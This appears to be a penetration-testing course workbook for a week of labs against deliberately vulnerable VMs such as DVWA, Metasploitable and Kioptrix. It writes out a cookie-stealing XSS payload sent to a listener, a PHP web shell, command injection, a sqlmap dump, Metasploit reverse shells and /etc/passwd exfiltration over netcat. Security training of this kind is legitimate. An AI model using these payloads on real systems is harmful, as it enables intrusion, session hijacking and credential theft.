# ⚙️ VAPT Workflow & Steps — Week 3

---

## Workflow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                    WEEK 3 — VAPT FULL CYCLE                         │
│                                                                     │
│  ┌─────────────────┐    ┌──────────────────┐    ┌───────────────┐  │
│  │  Lab 1          │    │  Lab 2           │    │  Lab 3        │  │
│  │  Advanced       │───▶│  Web Application │───▶│  Reporting    │  │
│  │  Exploitation   │    │  Testing         │    │  Practice     │  │
│  │                 │    │                  │    │               │  │
│  │ • XSS→RCE chain │    │ • Burp Suite     │    │ • PTES Report │  │
│  │ • PoC customise │    │ • sqlmap         │    │ • Exec brief  │  │
│  │ • Obfuscation   │    │ • OWASP ZAP      │    │ • Draw.io     │  │
│  └─────────────────┘    └──────────────────┘    └───────────────┘  │
│                                                         │           │
│                                                         ▼           │
│  ┌─────────────────┐    ┌──────────────────┐    ┌───────────────┐  │
│  │  Capstone       │    │  Lab 4           │    │  Lab 4 cont.  │  │
│  │  Kioptrix VAPT  │◀───│  Post-Exploit    │◀───│  Evidence     │  │
│  │                 │    │  Windows Priv-Esc│    │  Collection   │  │
│  │ • Recon         │    │                  │    │               │  │
│  │ • OpenVAS scan  │    │ • AlwaysInstall  │    │ • Wireshark   │  │
│  │ • Exploit       │    │   Elevated       │    │ • SHA256 hash │  │
│  │ • Report        │    │ • SYSTEM shell   │    │ • Chain of    │  │
│  └─────────────────┘    └──────────────────┘    │   custody     │  │
│                                                  └───────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Step-by-Step — All Labs

---

### Lab 1 — Advanced Exploitation

#### Step 1: XSS Cookie Theft Setup
```bash
# Start netcat listener on Kali
nc -lvp 8888
```
Navigate to `http://192.168.56.104/dvwa/vulnerabilities/xss_r/` → set security to Low.

#### Step 2: Inject Cookie-Stealing XSS
```
<script>document.location='http://192.168.56.101:8888?c='+document.cookie</script>
```
Paste in Name field → Submit → observe stolen cookie arrive in netcat.

#### Step 3: Hijack Session & Upload Shell
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
# Upload via http://192.168.56.104/dvwa/vulnerabilities/upload/
```

#### Step 4: Execute Shell
```bash
curl "http://192.168.56.104/dvwa/hackable/uploads/shell.php?cmd=id"
```

#### Step 5: Customise CVE-2021-22205 PoC
```bash
# Edit Python PoC — change target IP, add reverse shell payload
nano custom_cve_2021_22205.py
# Start listener
nc -lvp 4444
# Run PoC
python3 custom_cve_2021_22205.py
```

---

### Lab 2 — Web Application Testing

#### Step 6: Configure Burp Suite Proxy
```
Burp Suite → Proxy → Options → 127.0.0.1:8080
Browser proxy → 127.0.0.1:8080
```

#### Step 7: SQL Injection with sqlmap
```bash
# Get real PHPSESSID from browser DevTools first
sqlmap -u "http://192.168.56.104/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=REAL_VALUE; security=low" \
  -D dvwa -T users --dump --batch --no-cast --hex
```

#### Step 8: XSS Manual Testing via Burp
```
1. Intercept ON in Burp
2. Submit: <script>alert(1)</script>
3. Forward → confirm alert popup
4. Send to Repeater for further testing
```

#### Step 9: Command Injection
```
Navigate to: http://192.168.56.104/dvwa/vulnerabilities/exec/
Payload: 127.0.0.1; id
```

#### Step 10: File Upload Bypass
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
# Upload via DVWA → access at /dvwa/hackable/uploads/shell.php
```

#### Step 11: Broken Auth via Burp Intruder
```
1. Capture login request → Send to Intruder
2. Mark password field → Sniper attack
3. Load /usr/share/wordlists/rockyou.txt
4. Start attack → filter by response length
```

#### Step 12: OWASP ZAP Automated Scan
```bash
zaproxy &
# GUI: Enter http://192.168.56.104/dvwa/ → Active Scan
```

---

### Lab 3 — Reporting Practice

#### Step 13: Compile Findings Table
- Use template in `reports/VAPT_Week3_Report.md` Section 8
- CVSS score each finding

#### Step 14: Network Attack Path (Draw.io)
```
1. Open draw.io (https://app.diagrams.net)
2. Create nodes: Kali → DVWA → Database
3. Label arrows with attack technique
4. Export as PNG → save to assets/attack_path.png
```

#### Step 15: Draft Stakeholder Briefs
- Executive summary → Section 11 of report
- Developer escalation email → Section 10 of report

---

### Lab 4 — Post-Exploitation & Evidence

#### Step 16: Gain Initial Access to Windows 10 VM
```bash
# Use any available exploit or msfvenom payload delivered to Win10
# Or use previously established session
msf6 > sessions -l
```

#### Step 17: AlwaysInstallElevated Escalation
```bash
msf6 > use exploit/windows/local/always_install_elevated
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.101
msf6 > set LPORT 5555
msf6 > run

meterpreter > getuid   # verify NT AUTHORITY\SYSTEM
```

#### Step 18: Wireshark Traffic Capture
```bash
# Start capture
tshark -i eth0 -w /tmp/collected/http_traffic.pcap \
  -f "host 192.168.56.104 and port 80" -a duration:60

# Or in Wireshark GUI → capture → apply filter: http
```

#### Step 19: Collect Evidence Files
```bash
mkdir -p /tmp/collected
# From Metasploitable (via shell)
nc -lvp 9999 > /tmp/collected/passwd.txt
# On target: cat /etc/passwd | nc 192.168.56.101 9999
```

#### Step 20: Hash All Evidence
```bash
sha256sum /tmp/collected/passwd.txt       > /tmp/collected/hashes.txt
sha256sum /tmp/collected/http_traffic.pcap >> /tmp/collected/hashes.txt
sha256sum /tmp/collected/hosts.txt        >> /tmp/collected/hashes.txt
cat /tmp/collected/hashes.txt
```

---

### Lab 5 — Capstone (Kioptrix)

#### Step 21: Reconnaissance
```bash
nmap -A -sV 192.168.56.106 -oN logs/kioptrix_nmap.txt
```

#### Step 22: OpenVAS Scan
```
Open browser → https://192.168.56.103:9392
New Task → Target: 192.168.56.106 → Full and Fast → Start
```

#### Step 23: Exploit via Metasploit
```bash
msfconsole
msf6 > use exploit/linux/samba/trans2open
msf6 > set RHOSTS 192.168.56.106
msf6 > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 > set LHOST 192.168.56.101
msf6 > run
```

#### Step 24: Verify & Document
```bash
id       # confirm root
uname -a # system info
```

#### Step 25: Compile Capstone Report
- Fill Section 7 of `reports/VAPT_Week3_Report.md`
- Add screenshots to `assets/`

---

## Time Estimate

| Lab | Estimated Time |
|-----|---------------|
| Lab 1 — Advanced Exploitation | 45 min |
| Lab 2 — Web App Testing | 60 min |
| Lab 3 — Reporting | 30 min |
| Lab 4 — Post-Exploit & Evidence | 40 min |
| Lab 5 — Capstone | 45 min |
| **Total** | **~3.5 hours** |

---

